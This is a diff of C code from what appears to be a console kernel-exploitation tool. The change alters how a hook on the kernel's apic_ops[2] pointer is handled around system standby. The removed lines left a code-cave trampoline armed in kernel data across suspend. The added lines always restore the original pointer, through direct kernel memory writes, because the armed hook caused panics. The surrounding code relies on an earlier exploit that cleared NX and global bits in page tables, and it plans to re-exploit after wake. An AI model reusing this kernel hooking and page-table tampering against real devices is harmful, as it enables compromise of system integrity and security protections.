@@ -5488,11 +5488,7 @@ static void campaign_flatz_setup(void) {
                 printf("[+]   On resume: cpususpend_handler calls xapic_mode\n");
                 printf("[+]   → %s trampoline → original → returns normally\n",
                        hook_is_cave ? "cave" : "KLD");
-                if (hook_is_cave) {
-                    printf("[+]   Cave hook LEFT ARMED — will fire on resume!\n");
-                } else {
-                    printf("[+]   KLD hook restored — persistence markers only.\n");
-                }
+                printf("[+]   Hook restored to original before suspend.\n");
                 printf("[+]   Wake → re-exploit → re-run tool → check results\n");
             } else {
                 printf("[+] NOTE: Hook not armed. Enter REST MODE to test\n");
@@ -5502,55 +5498,35 @@ static void campaign_flatz_setup(void) {
             if (hook_armed) {
                 printf("[+]\n");
 
-                if (hook_is_cave) {
-                    /*
-                     * Cave trampoline: LEAVE ARMED during suspend.
-                     *
-                     * The cave trampoline lives in kdata (kdata_base+0x100).
-                     * Phase 5b permanently cleared NX and G in the guest PTE:
-                     *   - G=0: TLB entries are per-process (flushed on CR3 reload)
-                     *   - NX=0: page is executable in guest page tables
-                     *   - NPT allows execution on this PA (confirmed by ring-0 test)
-                     *
-                     * The trampoline calls through to the original xapic_mode
-                     * via g_trampoline_target, returning the correct APIC mode.
-                     *
-                     * On resume from S3, all TLBs are cold (hardware reset),
-                     * so stale entries are not a concern for the resume path.
-                     * The brief window between arming and suspend entry is safe
-                     * because G=0 means context switches flush this TLB entry,
-                     * and xapic_mode is only called during APIC suspend/resume.
-                     *
-                     * On resume: cpususpend_handler → lapic_resume →
-                     *   apic_ops[2](xapic_mode) → cave trampoline →
-                     *   original xapic_mode → returns 1 (xAPIC)
-                     *
-                     * The cave trampoline's proof marker write is DISABLED
-                     * (g_proof_marker_addr = 0) to avoid DMAP writes during
-                     * the constrained LAPIC suspend path.
-                     */
-                    printf("[*] Cave trampoline: LEAVING ARMED for suspend!\n");
-                    printf("    G=0 in guest PTE — no stale Global TLB risk.\n");
-                    printf("    NPT allows execution on kdata PA.\n");
-                    printf("    Trampoline calls original xapic_mode safely.\n");
-                    printf("    apic_ops[2] = 0x%016lx (cave trampoline)\n",
-                           (unsigned long)g_kmod_trampoline_func);
-                    printf("[+] On resume: cpususpend_handler → xapic_mode → CAVE TRAMPOLINE\n");
-                } else {
-                    /*
-                     * KLD trampoline: RESTORE before suspend.
-                     * KLD pages may not be NPT-executable on secondary CPUs.
-                     */
-                    printf("[*] KLD trampoline: Restoring apic_ops[2] before rest mode.\n");
+                /*
+                 * ALWAYS restore apic_ops[2] to original before suspend.
+                 *
+                 * Leaving the cave trampoline armed during suspend causes
+                 * kernel panics.  Even with G=0, NX cleared, and NPT
+                 * allowing execution, the trampoline crashes when called
+                 * by secondary CPUs during the LAPIC suspend path.
+                 * Root cause likely: the HV/NPT context during
+                 * cpususpend_handler is more constrained than normal
+                 * execution — secondary CPUs may not have the same NPT
+                 * mappings or the kdata page may not be executable in
+                 * the suspend context.
+                 *
+                 * The hook was verified working on the primary CPU.
+                 * Persistence markers (cave + QA flags) will confirm
+                 * resume detection after wake.
+                 */
+                printf("[*] Restoring apic_ops[2] to original before rest mode.\n");
+                if (hook_is_cave)
+                    printf("    Cave trampoline: leaving armed causes kernel panic.\n");
+                else
                     printf("    KLD pages may not be NPT-executable on secondary CPUs.\n");
-                    kernel_copyin(&original_xapic,
-                                  g_dmap_base + ops_pa + 0x10, 8);
-                    uint64_t restore_verify = 0;
-                    kernel_copyout(g_dmap_base + ops_pa + 0x10, &restore_verify, 8);
-                    printf("    apic_ops[2] restored: 0x%016lx [%s]\n",
-                           (unsigned long)restore_verify,
-                           restore_verify == original_xapic ? "OK" : "FAIL");
-                }
+                kernel_copyin(&original_xapic,
+                              g_dmap_base + ops_pa + 0x10, 8);
+                uint64_t restore_verify = 0;
+                kernel_copyout(g_dmap_base + ops_pa + 0x10, &restore_verify, 8);
+                printf("    apic_ops[2] restored: 0x%016lx [%s]\n",
+                       (unsigned long)restore_verify,
+                       restore_verify == original_xapic ? "OK" : "FAIL");
 
                 /* Enter rest mode programmatically */
                 printf("[*] Calling sceSystemStateMgrEnterStandby()...\n");
